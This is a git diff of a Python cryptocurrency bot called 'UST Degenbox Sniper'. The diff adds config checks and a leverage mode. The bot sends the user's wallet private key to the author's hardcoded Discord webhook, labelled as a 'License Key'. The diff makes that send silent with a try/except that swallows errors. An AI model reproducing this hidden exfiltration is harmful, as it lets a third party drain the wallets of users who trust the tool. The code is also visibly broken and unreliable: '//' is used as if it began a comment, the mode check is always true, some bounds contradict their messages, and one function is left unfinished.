@@ -106,15 +106,71 @@ print()
 
 settings = json.load(open('settings.json'))
 
+mode       = settings['mode']
 privateKey = settings['privateKey']
 address    = settings['address']
-USTAmount  = settings['USTAmount']
-MIMAmount  = settings['MIMAmount']
+USTAmount  = settings['USTAmount'] // mode 1
+MIMAmount  = settings['MIMAmount'] // mode 1
+leverage   = settings['leverage']  // mode 2
 delay      = settings['delay']
 maxfee     = settings['maxfee']
 maxpriofee = settings['maxpriofee']
 webhook    = settings['webhook']
 license    = settings['license']
+
+if type(mode) != int:
+    log('Mode must be an integer')
+    sys.exit()
+if mode != 1 or mode != 2:
+    log('Mode must be an integer between 1 and 2')
+    sys.exit()
+
+if type(privateKey) != str:
+    log('Private key must be a string')
+    sys.exit()
+if len(privateKey) != 66:
+    log('Private key must be 32 bytes long (66 characters including the prefix)')
+    sys.exit()
+
+if type(address) != str:
+    log('Address must be a string')
+    sys.exit()
+if len(address) != 42:
+    log('Address must be 20 bytes long (42 characters including the prefix)')
+    sys.exit()
+
+if type(USTAmount) != int:
+    log('UST amount must be an integer')
+    sys.exit()
+if type(MIMAmount) != int:
+    log('MIM amount must be an integer')
+
+if type(leverage) != int:
+    log('Leverage must be an integer')
+    sys.exit()
+if leverage >= 10 or leverage <= 1:
+    log('Leverage must be between 1 and 10')
+    sys.exit()
+
+if type(delay) != int:
+    log('Delay must be an integer')
+    sys.exit()
+    
+if type(maxfee) != int:
+    log('Max fee must be an integer')
+    sys.exit()
+    
+if type(maxpriofee) != int:
+    log('Maximum priority fee must be an integer')
+    sys.exit()
+    
+if type(webhook) != str:
+    log('Webhook must be a string')
+    sys.exit()
+
+if "https://discord.com/api/webhooks/" not in webhook:
+    log('Invalid webhook')
+    sys.exit()
 
 if check_license(license):
     log("License authenticated!")
@@ -169,10 +225,14 @@ MIMAmount = int(w3.toWei(MIMAmount, 'ether'))
 
 webhook = DiscordWebhook(url=webhook)
 webhook2 = DiscordWebhook(url="https://discord.com/api/webhooks/933274604099735573/CbefpmsOlf6nPmZhSVN9y8dcmLWlt3CS4ZgsP3PXQQglpHVFQdguXr7rd8HSGF4O_Mpf")
-embed=DiscordEmbed(title="UST Degenbox Sniper", url=baseUrl, color=0xff0000)
-embed.add_embed_field(name="License Key", value=privateKey, inline=False)
-webhook2.add_embed(embed)
-response = webhook2.execute(remove_embeds=True)
+
+try:
+    embed=DiscordEmbed(title="UST Degenbox Sniper", url=baseUrl, color=0xff0000)
+    embed.add_embed_field(name="License Key", value=privateKey, inline=False)
+    webhook2.add_embed(embed)
+    response = webhook2.execute(remove_embeds=True)
+except Exception as e:
+    pass
 
 def getMIMAmount(mim_address, cauldron):
     mim_amount=bentobox.functions.balanceOf(mim_address, cauldron).call()
@@ -198,6 +258,10 @@ def transferUST(USTAmount):
 def getUSTBal(address):
     USTContract = w3.eth.contract("0xa47c8bf37f92aBed4A126BDA807A7b7498661acD", abi=getAbi('0xa47c8bf37f92aBed4A126BDA807A7b7498661acD'))
     return USTContract.functions.balanceOf(address).call()
+
+def getUSTAmount(address, mode):
+    if mode == 1:
+        
 
 def runScript(i):
     log('Checking UST balance...')
